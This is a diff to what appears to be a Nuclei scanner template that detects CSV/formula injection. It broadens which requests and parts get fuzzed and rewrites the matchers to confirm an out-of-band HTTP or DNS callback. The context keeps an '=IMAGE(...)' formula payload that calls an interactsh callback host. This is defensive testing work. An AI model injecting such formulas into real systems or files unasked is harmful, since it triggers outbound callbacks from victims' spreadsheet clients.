@@ -12,7 +12,7 @@ http:
   - pre-condition:
       - type: dsl
         dsl:
-          - 'method == "GET"'
+          - 'method != "OPTIONS"'
 
     payloads:
       csv_fuzz:
@@ -28,22 +28,17 @@ http:
         - '=IMAGE("https://{{interactsh-url}}/images/srpr/logo3w.png")'
 
     fuzzing:
-      - part: query
+      - part: request
         type: replace # replaces existing parameter value with fuzz payload
         mode: multiple # replaces all parameters value with fuzz payload
         fuzz:
           - '{{csv_fuzz}}'
 
-    matchers-condition: and
+    stop-at-first-match: true
     matchers:
-      - type: word
-        part: interactsh_protocol # Confirms the HTTP Interaction
-        words:
-          - "http"
-
-      - type: word
-        part: header
-        words:
-          - "text/csv"
-          - "application/csv"
-          - "application/vnd.ms-excel"
+      - type: dsl
+        name: oob-interaction
+        dsl:
+          - 'contains(interactsh_protocol, "http") || contains(interactsh_protocol, "dns")'
+          - 'contains(header, "csv") || contains(header, "excel") || contains(header, "spreadsheet")'
+        condition: and
